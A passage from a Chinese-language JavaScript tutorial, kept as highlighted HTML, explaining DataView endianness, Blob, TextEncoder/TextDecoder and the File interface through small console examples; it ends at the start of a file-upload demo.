punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>dv<span class="token punctuation">.</span><span class="token function">getInt8</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>dv<span class="token punctuation">.</span><span class="token function">getInt16</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 513</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>dv<span class="token punctuation">.</span><span class="token function">getInt16</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 258</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>dv<span class="token punctuation">.</span><span class="token function">getInt16</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 258</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为 <code>513</code> 的这一行代码，使用的是 little endian 格式，并且 513 这个值也与之前 <code>TypedArray</code> 中关于 <code>Int16Array</code> 例子的结果一致，证明 <code>TypedArray</code> 默认使用的是 <strong>little endian</strong> 格式在操作数据缓冲区；</p><h3 id="Write"><a href="#Write" class="headerlink" title="Write"></a>Write</h3><p>以 <code>setInt8()</code> 为例，接受两个参数：<code>setInt8(byteOffset, value)</code>，第一个表示偏移字节量，用于定位，第二个则是要设置的具体值，非数字类型会报错；类似地，<code>setInt16</code> 等用于设置超过 1 字节的方法，也提供第三个可选参数 <code>littleEndian</code>，表示是否以 little endian 格式设置；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> buffer1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> buffer2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> dv1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> dv2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer2<span class="token punctuation">)</span><span class="token punctuation">;</span>dv1<span class="token punctuation">.</span><span class="token function">setInt8</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dv1<span class="token punctuation">.</span><span class="token function">setInt8</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> i8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span>dv1<span class="token punctuation">.</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i8<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Int8Array(2) [1, 2]</span>dv2<span class="token punctuation">.</span><span class="token function">setUint16</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">513</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dv2<span class="token punctuation">.</span><span class="token function">setUint16</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">513</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> i16 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint16Array</span><span class="token punctuation">(</span>dv2<span class="token punctuation">.</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i16<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Int16Array(2) [513, 258]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要注意的就是，因为 <code>byteOffset</code> 这个参数的单位始终是 <strong>1 字节</strong>，所以当写入超过一字节的数据时，相应的偏移值也需要增加，就像上例所以展示的一样；</p><h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><p>与前文所讲的 <code>TyptedArray</code> 视图接口相比，<code>DataView</code> 视图虽然兼容了不同平台的字节序问题，但是也没有了一些对整段数据进行修改拼接的功能，只能修改单个元素值；另外也不能用构造函数初始赋值，比如下面的情况：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Int8Array(3) [1, 2, 3]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Uncaught TypeError: First argument to DataView constructor must be an ArrayBuffer</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以，需要灵活地结合二者使用，以应对复杂的场景；兄弟齐心，其力断金；</p><h1 id="Blob"><a href="#Blob" class="headerlink" title="Blob"></a>Blob</h1><p><code>Blob</code> 构造函数用于描述一个 blob（Binary Large OBject，二进制大对象），即保存原始数据的类文件对象，支持保存 <strong>多种类型</strong> 的数据（不像 <code>TypedArray</code>，只能使用数字类型），并且数据是只读的，不可修改；另一个基于 Blob 的构造函数 <code>File</code>，就是用来处理用户上传文件的（<code>&lt;input type=&quot;file&quot;&gt;</code>）数据。</p><p>语法：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>array</code> 指的是一系列类型的数据构成的数组或者类数组，这些数据可以是字符串、ArrayBuffer、DataView、TypedArray、Blob、DOMString 等等；<code>options</code> 则是一个对象，可以包含以下两个属性：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token comment">// 传入的数据的 MIMS 类型，比如 text/plain，默认为空</span>    <span class="token literal-property property">endings</span><span class="token operator">:</span> <span class="token string">""</span> <span class="token comment">// 如何处理数据中的换行符，比如 \n 和  \r\n，因操作系统而异</span>                <span class="token comment">// 值为 transparent 或者 native，默认为 transparent</span>                <span class="token comment">// native 表示替换为当前系统的换行符</span>                <span class="token comment">// transparent 则表示不替换，保持数据内容</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="写入数据"><a href="#写入数据" class="headerlink" title="写入数据"></a>写入数据</h2><p>通过几个例子来说明：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> blob1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> blob2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'bc'</span><span class="token punctuation">,</span> <span class="token string">'d e'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> blob3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/plain'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> blob4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Int8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> blob5 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>blob2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>blob1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Blob &#123;size: 3, type: ""&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>blob2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Blob &#123;size: 6, type: ""&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>blob3<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Blob &#123;size: 5, type: "text/plain"&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>blob4<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Blob &#123;size: 3, type: ""&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>blob5<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Blob &#123;size: 6, type: ""&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果参入的参数不是类数组的类型，则会报错：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> blob1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> blob2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> blob3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">foo</span><span class="token operator">:</span> <span class="token string">'bar'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> blob4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> blob5 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span>blob1<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>blob1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// VM3497:1 Uncaught TypeError: Failed to construct 'Blob': </span><span class="token comment">// The provided value cannot be converted to a sequence.</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>blob2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// VM3497:1 Uncaught TypeError: Failed to construct 'Blob': </span><span class="token comment">// The provided value cannot be converted to a sequence.</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>blob3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// VM3497:1 Uncaught TypeError: Failed to construct 'Blob': </span><span class="token comment">// The provided value cannot be converted to a sequence.</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>blob4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// VM3497:1 Uncaught TypeError: Failed to construct 'Blob': </span><span class="token comment">// The provided value cannot be converted to a sequence.</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>blob5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// VM3497:1 Uncaught TypeError: Failed to construct 'Blob': </span><span class="token comment">// The provided value cannot be converted to a sequence.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h2><p>写入 Blob 实例中的数据虽然不能修改，但是还是可以读取的，首先可以获取数据总的大小和类型（只读）：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/plain'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>blob<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>blob<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// text/plain</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>.text()</strong> 方法用于获取 Blob 中的文本数据，返回值是一个 promise 对象，包含一个 resolved 状态的文本数据，无提供的参数；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>blob<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token keyword">typeof</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 123 string</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>.arrayBuffer()</strong> 方法也用于获取 Blob 中的数据，并且返回一个 promise，无参数提供，只不过返回的是数据的 <code>ArrayBuffer</code>，即二进制数据缓冲区；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> blob1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> blob2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>blob1<span class="token punctuation">.</span><span class="token function">arrayBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Uint8Array(3) [49, 50, 51]</span>blob2<span class="token punctuation">.</span><span class="token function">arrayBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Uint8Array(3) [97, 98, 99]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>计算以下也可以验证，类型数组中的数值确实是对应的原始数据的二进制值。</p><h1 id="TextEncoder"><a href="#TextEncoder" class="headerlink" title="TextEncoder"></a>TextEncoder</h1><p>临阵磨枪，不快也光；这还是一个处于 <strong>实验阶段</strong> 的接口，当前的接口将来可能发生改变，并且目前 IE 系列浏览器都还不支持，这里只作简单介绍；</p><p>顾名思义，这个构造函数的作用就是负责编码文本，其实就是以指定的编码格式，将传入的文本转换成该数据对应的 <strong>类型化数组</strong>；实例化时可以提供一个参数，用于编码格式，不过目前默认并且只使用 UTF-8 格式编码，所以可以省略；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> encoder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> arr <span class="token operator">=</span> encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>encoder<span class="token punctuation">.</span>encoding<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// utf-8</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Uint8Array(3) [97, 98, 99]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有编码就自然有解码，<code>TextDecode</code> 这个构造函数就与之对应，即将 <code>ArrayBuffer</code> 或者 <code>ArrayBuffer View</code> 类型的数据解码为相应的文本；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> ui8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> buffer <span class="token operator">=</span> ui8<span class="token punctuation">.</span>buffer<span class="token punctuation">;</span><span class="token keyword">var</span> decoder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> text1 <span class="token operator">=</span> decoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>ui8<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> text2 <span class="token operator">=</span> decoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>text1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// abc</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>text2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// abc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样，除了上面的 <code>Blob</code>，这里的 <code>TextEncoder</code> 也可以用于将文本数据保存为 JavaScript 中的二进制缓冲数据；</p><h1 id="处理文件数据"><a href="#处理文件数据" class="headerlink" title="处理文件数据"></a>处理文件数据</h1><p>人外有人，天外有天，跨过了这二进制，便是更广阔的天地；说了一系列的关于二进制数据的保存和读写方法，也该谈谈其用武之地了；</p><p>要知道 JavaScript 中保存文本字符串什么的用变量就行了，缓冲区、类型数组、Blob 这些接口其实多数是用于处理文件数据相关的，因为它们有着不同的 MIME 类型，比如 <code>.jpg .mp4 .bin</code> 这些后缀的文件，JavaScript 并没有内置一些直接处理这些数据类型的接口（例如 .txt 文档就能可以处理），所以就需要以原生二进制数据的方式来保存或处理，方便用户上传、下载或预览；下面就将介绍一些文件处理相关的接口；</p><h2 id="File"><a href="#File" class="headerlink" title="File"></a>File</h2><p>前面讲到，<code>File</code> 是基于 <code>Blob</code> 的，所以也就继承了它的一些方法；<code>File</code> 用于提供有关文件的信息和内容，语法如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> name<span class="token punctuation">[</span><span class="token punctuation">,</span> options<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>content</code> 指要创建的文件内容，是 <code>ArrayBuffer, View, Blob, DOMString</code> 等类型构成的 <strong>数组</strong> 或者类数组；<code>name</code> 则是文件的名称或者路径；<code>options</code> 参数可选，包含 <code>type</code> 和 <code>lastModified</code> 两个属性；</p><p>举例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> content <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">'hello world!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> <span class="token string">'test.txt'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/plain'</span><span class="token punctuation">,</span> <span class="token comment">// 可选，默认为空</span>    <span class="token literal-property property">lastModified</span><span class="token operator">:</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 可选，后面是默认值</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// test.txt</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 12</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// text/plain</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>lastModified<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1583638485180</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>File</code> 构造函数自身并没有自带一些方法，而是继承了 <code>Blob</code> 的方法，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'hello world!'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'text.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 初始化内容可以直接是字符串，只是需要放在数组中</span>file<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// hello world!</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>file<span class="token punctuation">.</span><span class="token function">arrayBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> text <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// hello world!</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实，一般很少像这样用 <code>File</code> 接口来直接创建一个文件对象，多数是用在用户上传文件等情况，比如在网页中用 <code>&lt;input type=&quot;file&quot; /&gt;</code> 标签来上传文档，而用户点击上传后，与文件相关的信息就被包含在了这个 <code>input</code> 标签的节点引用的 <code>files</code> 属性中，这个 <code>files</code> 属性值是一个 <code>FileList</code> 接口的实例，就是包含所有上传文件的数组，其中每个元素都是一个 <code>File</code> 接口的实例；</p><p>通过一个简单的 demo 进行说明：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">HTML</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token 